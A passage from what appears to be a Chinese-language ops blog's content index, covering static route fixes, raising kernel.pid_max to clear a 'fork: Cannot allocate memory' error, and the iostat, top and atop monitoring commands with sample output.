-qvv; sleep 60; /var/cfengine/bin/cfagent -qvv<br>modprobe toa<br>/etc/rc3.d/S27route<br><br>[root@localhost /]# cat /etc/rc3.d/S27route<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.74.0.0/16 gw 218.xx.xx.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.78.0.0/16 gw 218.xx.xx.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.48.0.0/16 gw 218.xx.xx.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.68.0.0/16 gw 218.xx.xx.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.0.0.0/8 gw 172.16.108.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 172.16.0.0/16 gw 172.16.108.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 192.168.0.0/16 gw 172.16.108.1<br><br></code></pre></td></tr></table></figure><p>执行对应的路由操作即可</p><p>处理前后对比</p><p>处理前，内网eth1不通的路由</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@localhost ata]<span class="hljs-comment"># route </span><br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>218.xx.xx.0    *               255.255.255.0   U    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>172.16.108.0    *               255.255.255.0   U    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth1<br>10.48.0.0       218.xx.xx.1    255.255.0.0     UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>10.68.0.0       218.xx.xx.1    255.255.0.0     UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>10.74.0.0       218.xx.xx.1    255.255.0.0     UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>link-local      *               255.255.0.0     U    <span class="hljs-number"> 1002 </span> <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>link-local      *               255.255.0.0     U    <span class="hljs-number"> 1003 </span> <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth1<br>10.78.0.0       218.xx.xx.1    255.255.0.0     UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>default         218.xx.xx.1    0.0.0.0         UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br></code></pre></td></tr></table></figure><p>处理前，内网eth1通的路由</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">[root@localhost /]</span># route -n<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br><span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">0</span>    <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>   U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">172.16.108.0</span>    <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>   U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">10.48.0.0</span>       <span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">10.68.0.0</span>       <span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">172.16.0.0</span>      <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">108</span>.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">10.74.0.0</span>       <span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">169.254.0.0</span>     <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     U     <span class="hljs-number">1002</span>   <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">169.254.0.0</span>     <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     U     <span class="hljs-number">1003</span>   <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">192.168.0.0</span>     <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">108</span>.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">10.78.0.0</span>       <span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">10.0.0.0</span>        <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">108</span>.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>       UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">0.0.0.0</span>         <span class="hljs-number">218</span>.<span class="hljs-number">30</span>.<span class="hljs-number">108</span>.<span class="hljs-number">1</span>    <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>error_fork_cannot_allocate_memory</title>
    <link href="/2024/04/03/yunwei/errors/Linuxerrors/error_fork_cannot_allocate_memory/"/>
    <url>/2024/04/03/yunwei/errors/Linuxerrors/error_fork_cannot_allocate_memory/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CentOS6中终端中执行命令提示报错</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">[root@web-<span class="hljs-number">54</span> vsftpd]<span class="hljs-comment"># service vsftpd status</span><br><span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/init.d/</span>functions: fork: Cannot allocate memory<br><span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/init.d/</span>functions: fork: Cannot allocate memory<br></code></pre></td></tr></table></figure><h2 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h2><p>系统进程数不足导致</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h3><h4 id="查看Linux最大进程数配置"><a href="#查看Linux最大进程数配置" class="headerlink" title="查看Linux最大进程数配置"></a>查看Linux最大进程数配置</h4><p>sysctl kernel.pid_max</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># sysctl kernel.pid_max</span><br><span class="hljs-attr">kernel.pid_max</span> = <span class="hljs-number">32768</span><br></code></pre></td></tr></table></figure><h4 id="查看当前Linux进程数"><a href="#查看当前Linux进程数" class="headerlink" title="查看当前Linux进程数"></a>查看当前Linux进程数</h4><p>ps -eLf | wc -l</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@web</span><span class="hljs-number">-54</span> vsftpd]<span class="hljs-meta"># ps -eLf | wc -l</span><br><span class="hljs-number">32610</span><br></code></pre></td></tr></table></figure><h3 id="具体解决方案"><a href="#具体解决方案" class="headerlink" title="具体解决方案"></a>具体解决方案</h3><p>进程数即将到设置的上线，修改最大进程数配置</p><h4 id="临时生效"><a href="#临时生效" class="headerlink" title="临时生效"></a>临时生效</h4><p>echo 1000000 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># echo 1000000 &gt; /proc/sys/kernel/pid_max</span><br><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># sysctl kernel.pid_max</span><br><span class="hljs-attr">kernel.pid_max</span> = <span class="hljs-number">1000000</span><br></code></pre></td></tr></table></figure><h4 id="长久生效"><a href="#长久生效" class="headerlink" title="长久生效"></a>长久生效</h4><p>echo “kernel.pid_max&#x3D;1000000” &gt;&gt; &#x2F;etc&#x2F;sysctl.conf</p><p>sysctl -p</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># echo &quot;kernel.pid_max=1000000&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># sysctl -p</span><br><span class="hljs-attr">net.ipv4.ip_forward</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.default.rp_filter</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.default.accept_source_route</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">kernel.sysrq</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">kernel.core_uses_pid</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.tcp_syncookies</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.bridge.bridge-nf-call-ip6tables</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.bridge.bridge-nf-call-iptables</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.bridge.bridge-nf-call-arptables</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">kernel.msgmnb</span> = <span class="hljs-number">65536</span><br><span class="hljs-attr">kernel.msgmax</span> = <span class="hljs-number">65536</span><br><span class="hljs-attr">kernel.shmmax</span> = <span class="hljs-number">68719476736</span><br><span class="hljs-attr">kernel.shmall</span> = <span class="hljs-number">4294967296</span><br><span class="hljs-attr">kernel.panic</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.all.accept_redirects</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.ipv4.conf.default.accept_redirects</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.ipv4.conf.all.send_redirects</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.ipv4.conf.default.send_redirects</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.ipv4.conf.default.arp_ignore</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.default.arp_announce</span> = <span class="hljs-number">2</span><br><span class="hljs-attr">net.ipv4.conf.all.arp_ignore</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.all.arp_announce</span> = <span class="hljs-number">2</span><br><span class="hljs-attr">net.ipv4.ip_no_pmtu_disc</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">kernel.pid_max</span> = <span class="hljs-number">1000000</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>errors</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>errors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/04/01/yunwei/yunweicommands/Linuxcommands/iostat/"/>
    <url>/2024/04/01/yunwei/yunweicommands/Linuxcommands/iostat/</url>
    
    <content type="html"><![CDATA[<p>查看磁盘  </p><p>iostat -kdx 1</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># iostat -kdx 1</span><br>Linux <span class="hljs-number">3.10</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">1160.108</span>.<span class="hljs-number">1</span>.el7.x86_64 (iZbp1191gh7vw52537lyxrZ) <span class="hljs-number">2024</span>年<span class="hljs-number">04</span>月<span class="hljs-number">01</span>日 _x86_64_(<span class="hljs-number">2</span> CPU)<br><br><span class="hljs-params">Device:</span>         rrqm<span class="hljs-symbol">/s</span>   wrqm<span class="hljs-symbol">/s</span>     r<span class="hljs-symbol">/s</span>     w<span class="hljs-symbol">/s</span>    rkB<span class="hljs-symbol">/s</span>    wkB<span class="hljs-symbol">/s</span> avgrq-sz avgqu-sz   await r_await w_await  svctm  %util<br>vda               <span class="hljs-number">0.01</span>     <span class="hljs-number">0.54</span>    <span class="hljs-number">0.69</span>    <span class="hljs-number">0.93</span>    <span class="hljs-number">13.30</span>    <span class="hljs-number">22.99</span>    <span class="hljs-number">44.85</span>     <span class="hljs-number">0.05</span>   <span class="hljs-number">28.32</span>    <span class="hljs-number">6.07</span>   <span class="hljs-number">44.98</span>   <span class="hljs-number">0.69</span>   <span class="hljs-number">0.11</span><br><br><span class="hljs-params">Device:</span>         rrqm<span class="hljs-symbol">/s</span>   wrqm<span class="hljs-symbol">/s</span>     r<span class="hljs-symbol">/s</span>     w<span class="hljs-symbol">/s</span>    rkB<span class="hljs-symbol">/s</span>    wkB<span class="hljs-symbol">/s</span> avgrq-sz avgqu-sz   await r_await w_await  svctm  %util<br>vda               <span class="hljs-number">0.00</span>     <span class="hljs-number">0.00</span>    <span class="hljs-number">1.00</span>    <span class="hljs-number">0.00</span>     <span class="hljs-number">8.00</span>     <span class="hljs-number">0.00</span>    <span class="hljs-number">16.00</span>     <span class="hljs-number">0.00</span>    <span class="hljs-number">1.00</span>    <span class="hljs-number">1.00</span>    <span class="hljs-number">0.00</span>   <span class="hljs-number">2.00</span>   <span class="hljs-number">0.20</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>top</title>
    <link href="/2024/04/01/yunwei/yunweicommands/Linuxcommands/top/"/>
    <url>/2024/04/01/yunwei/yunweicommands/Linuxcommands/top/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>默认自带该命令</p><p>用于实时动态的查看系统的整体运行情况</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>top(选项)</p><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><p>-b : 以批处理模式操作</p><p>-c : 显示完整的命令</p><p>-d : 屏幕刷新间隔时间   -d ss.tt (seconds.tenths)</p><p>-I ：忽略失效过程</p><p>-s ：累积模式</p><p>-i&lt;时间&gt;  : 设置间隔时间</p><p>-u&lt;用户名&gt;：指定用户名</p><p>-p&lt;进程号&gt;：指定进程</p><p>-n&lt;次数&gt;：循环显示的次数</p><p>-o [+&#x2F;-]fieldname1 ：指定排序字段，+表示降序，-表示升序</p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@VM_160_165_centos</span> ~]# top<br>top - <span class="hljs-number">20</span>:<span class="hljs-number">39</span>:<span class="hljs-number">29</span> up <span class="hljs-number">4</span> days<span class="hljs-punctuation">,</span> <span class="hljs-number">28</span> <span class="hljs-keyword">min</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">2</span> users<span class="hljs-punctuation">,</span>  <span class="hljs-keyword">load</span> average: <span class="hljs-number">0.00</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.00</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.00</span><br>Tasks: <span class="hljs-number">110</span> total<span class="hljs-punctuation">,</span>   <span class="hljs-number">1</span> running<span class="hljs-punctuation">,</span> <span class="hljs-number">109</span> sleeping<span class="hljs-punctuation">,</span>   <span class="hljs-number">0</span> stopped<span class="hljs-punctuation">,</span>   <span class="hljs-number">0</span> zombie<br>Cpu(s):  <span class="hljs-number">0.2</span><span class="hljs-variable">%us</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.2</span><span class="hljs-variable">%sy</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.0</span><span class="hljs-variable">%ni</span><span class="hljs-punctuation">,</span> <span class="hljs-number">99.0</span><span class="hljs-variable">%id</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.7</span><span class="hljs-variable">%wa</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.0</span><span class="hljs-variable">%hi</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.0</span><span class="hljs-variable">%si</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.0</span><span class="hljs-variable">%st</span><br>Mem:   <span class="hljs-number">3922456</span>k total<span class="hljs-punctuation">,</span>  <span class="hljs-number">1292332</span>k used<span class="hljs-punctuation">,</span>  <span class="hljs-number">2630124</span>k <span class="hljs-keyword">free</span><span class="hljs-punctuation">,</span>   <span class="hljs-number">667296</span>k buffers<br>Swap:        <span class="hljs-number">0</span>k total<span class="hljs-punctuation">,</span>        <span class="hljs-number">0</span>k used<span class="hljs-punctuation">,</span>        <span class="hljs-number">0</span>k <span class="hljs-keyword">free</span><span class="hljs-punctuation">,</span>   <span class="hljs-number">427100</span>k cached<br><br>  PID USER      PR  NI  VIRT  RES  SHR S <span class="hljs-variable">%CPU</span> <span class="hljs-variable">%MEM</span>    TIME+  COMMAND                                                                          <br><span class="hljs-number">25723</span> root      <span class="hljs-number">20</span>   <span class="hljs-number">0</span> <span class="hljs-number">62160</span> <span class="hljs-number">9472</span> <span class="hljs-number">2108</span> S  <span class="hljs-number">0.3</span>  <span class="hljs-number">0.2</span>   <span class="hljs-number">0</span>:<span class="hljs-number">01.02</span> barad_agent                                                                       <br><span class="hljs-number">25724</span> root      <span class="hljs-number">20</span>   <span class="hljs-number">0</span>  <span class="hljs-number">434</span>m  <span class="hljs-number">12</span>m <span class="hljs-number">2240</span> S  <span class="hljs-number">0.3</span>  <span class="hljs-number">0.3</span>   <span class="hljs-number">0</span>:<span class="hljs-number">05.51</span> barad_agent  <br></code></pre></td></tr></table></figure><p>说明：</p><p>top - 20:39:29当前系统时间</p><p>up 4 days, 28 min系统运行时间</p><p>2 users当前登录用户</p><p>load average: 0.00, 0.00, 0.00系统负载，任务队列的平均长度</p><p>Tasks: 110 total总进程数</p><p>1 running正在运行的进程数</p><p>109 sleeping睡眠的进程数</p><p> 0 stopped停止的进程数</p><p>0 zombie冻结的进程数</p><p>Cpu(s):  0.2%us用户空间占用 CPU 百分比</p><p>0.2%sy内核空间占用 CPU 百分比</p><p>0.0%ni用户进程空间内改变过优先级的进程占用CPU百分比</p><p>99.0%id空闲 CPU 百分比</p><p>0.7%wa等待输入输出的 CPU 时间百分比</p><p>0.0%si</p><p>0.0%st</p><p>Mem:   3922456k total物理内存总量</p><p>1292332k used使用的物理内存总量</p><p>2630124k free空闲内存总量</p><p>667296k buffers用作内核缓存的内存量</p><p>Swap:        0k total交换区内存总量</p><p>0k used使用的交换区总量</p><p>0k free空闲交换区总量</p><p>427100k cached缓冲的交换区总量</p><p>VIRT</p><p>virtual memory usage 虚拟内存</p><p>进程需要的虚拟内存大小</p><p>如果进程申请 100M 内存，实际只使用 10 M ，值会增长 100M</p><p>RES</p><p>resident memory usage 常驻内存</p><p>进程当前使用的内存大小，不包括 swap out</p><p>包含其他进程的共享</p><p>只统计加载的库文件所占内存大小</p><p>如果进程申请 100M 内存，实际只使用 10M ，值只会增长 10M，与 VIRT 相反</p><p>SHR</p><p>shared memory 共享内存</p><p>除了自身进程的共享内存，也包括其他进程的共享内存</p><p>虽然进程只使用几个共享库的函数，但是包含了整个共享库的大小</p><p>某个进程所占物理内存大小： RES - SHR</p><p>swap out 后，值会下降</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="查看每个-CPU-的使用情况"><a href="#查看每个-CPU-的使用情况" class="headerlink" title="查看每个 CPU 的使用情况"></a>查看每个 CPU 的使用情况</h3><p>top 命令之后按  1  ,会显示每个 CPU 的使用情况，如果不操作，显示的是 CPU 的平均状态</p><p><img src="/2024/04/01/yunwei/yunweicommands/Linuxcommands/top/clipboard-16377255556361.png" alt="img"></p><p>load average: 237.05, 235.56, 231.97</p><p>这个值是 CPU 内存 硬盘 综合的负载</p><h3 id="查看指定进程的完整命令"><a href="#查看指定进程的完整命令" class="headerlink" title="查看指定进程的完整命令"></a>查看指定进程的完整命令</h3><p>top -c -p 1097</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/home/ubuntu<span class="hljs-comment"># top -c -p 1097</span><br>top - 16:36:12 up<span class="hljs-number"> 1 </span>day, 17:56, <span class="hljs-number"> 2 </span>users,  load average: 0.00, 0.00, 0.00<br>Tasks:  <span class="hljs-number"> 1 </span>total,  <span class="hljs-number"> 0 </span>running,  <span class="hljs-number"> 1 </span>sleeping,  <span class="hljs-number"> 0 </span>stopped,  <span class="hljs-number"> 0 </span>zombie<br>%Cpu(s):  0.7 us,  0.2 sy,  0.0 ni, 99.2 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st<br>MiB Mem :   3935.6 total,   2508.0 free,    309.4 used,   1118.1 buff/cache<br>MiB Swap:      0.0 total,      0.0 free,      0.0 used.   3385.2 avail Mem<br><br>    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND<br>  <span class="hljs-number"> 1097 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span><span class="hljs-number"> 874176 </span><span class="hljs-number"> 89136 </span><span class="hljs-number"> 49940 </span>S   0.0   2.2   0:21.24 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock<br></code></pre></td></tr></table></figure><h3 id="3、查看CPU占用"><a href="#3、查看CPU占用" class="headerlink" title="3、查看CPU占用"></a>3、查看CPU占用</h3><p><strong>top -c -o +%CPU</strong></p><p>以%CPU为指标降序排列</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/home/ubuntu<span class="hljs-comment"># top -c -o +%CPU</span><br>top - 16:41:52 up<span class="hljs-number"> 1 </span>day, 18:01, <span class="hljs-number"> 2 </span>users,  load average: 0.05, 0.03, 0.00<br>Tasks:<span class="hljs-number"> 115 </span>total,  <span class="hljs-number"> 1 </span>running,<span class="hljs-number"> 114 </span>sleeping,  <span class="hljs-number"> 0 </span>stopped,  <span class="hljs-number"> 0 </span>zombie<br>%Cpu(s):  0.2 us,  0.2 sy,  0.0 ni, 99.7 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st<br>MiB Mem :   3935.6 total,   2508.6 free,    308.6 used,   1118.4 buff/cache<br>MiB Swap:      0.0 total,      0.0 free,      0.0 used.   3386.0 avail Mem<br><br>    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND<br>    <span class="hljs-number"> 10 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>S   0.3   0.0   0:01.16 [ksoftirqd/0]<br>  <span class="hljs-number"> 1670 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span> <span class="hljs-number"> 47856 </span><span class="hljs-number"> 11448 </span> <span class="hljs-number"> 3872 </span>S   0.3   0.3   1:32.43 barad_agent<br>  <span class="hljs-number"> 1671 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span><span class="hljs-number"> 491996 </span><span class="hljs-number"> 14372 </span> <span class="hljs-number"> 4312 </span>S   0.3   0.4   7:37.78 barad_agent<br></code></pre></td></tr></table></figure><p>dmidecode | grep Product</p><p>查看物理机型号</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">[root@iZbp1191gh7vw52537lyxrZ ~]# dmidecode | grep <span class="hljs-built_in">Product</span><br><span class="hljs-built_in">Product</span> <span class="hljs-built_in">Na</span><span class="hljs-symbol">me:</span> Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><p>atop</p><p>ATOP - 10                               2019&#x2F;04&#x2F;29  21:06:18                               ———                                10s elapsed</p><p>PRC | sys    0.22s | user   0.17s  | #proc    809 | #trun      1 | #tslpi   800  | #tslpu   242 | #zombie    0 | clones     0  | #exit      0 |</p><p>CPU | sys       2% | user      1%  | irq       0% | idle   3041% | wait    156%  | steal     0% | guest     0% | curf 2.50GHz  | curscal   ?% |</p><p>CPL | avg1  235.50 | avg5  232.99  | avg15 232.35 |              |               | csw     4910 | intr   14354 |               | numcpu    32 |</p><p>MEM | tot    31.3G | free  563.4M  | cache  14.2G | dirty   0.5M | buff  843.2M  | slab  980.2M | slrec 855.1M | shmem   0.2M  | shrss   0.0M |</p><p>SWP | tot   128.0G | free  